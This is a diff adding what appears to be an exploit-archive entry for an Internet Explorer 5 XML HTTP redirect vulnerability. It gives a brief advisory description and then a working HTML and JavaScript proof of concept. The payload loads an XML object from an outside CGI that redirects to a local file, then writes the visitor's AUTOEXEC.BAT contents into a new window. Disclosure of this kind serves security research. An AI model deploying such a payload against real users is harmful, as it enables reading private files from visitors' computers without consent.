@@ -1,0 +1,24 @@
+MS IE 5.0 for Windows 2000/Windows 95/Windows 98/Windows NT 4 XML HTTP Redirect Vulnerability
+
+source: http://www.securityfocus.com/bid/815/info
+
+A vulnerability in the method IE5 uses to process XML data may allow a malicious web site owner to read files on a visiting user's computer. A web page may be created that contains an XML object type that contains instructions to read known files on a visitor's local host (and or domain). The IE5 client will allow the XML redirect to access files within its own domain.
+
+Note that if this vulnerability is exploited for IE5 for Unix, the only reported result is that the application will suffer an "Internal Error" and crash. 
+
+<object id="xm" type="text/xml"
+data="http://www.nat.bg/~joro/reject.cgi?autoexec" width=400 height=200>
+</object>
+<SCRIPT>
+function f()
+{
+s=xm.body.innerHTML;
+a=window.open();
+//alert(s);
+a.document.open();
+a.document.write("Here is a part of AUTOEXEC.BAT (the error message is
+normal):<BR>"+s);
+a.document.close();
+}
+setTimeout("f()",5000);
+</SCRIPT> 
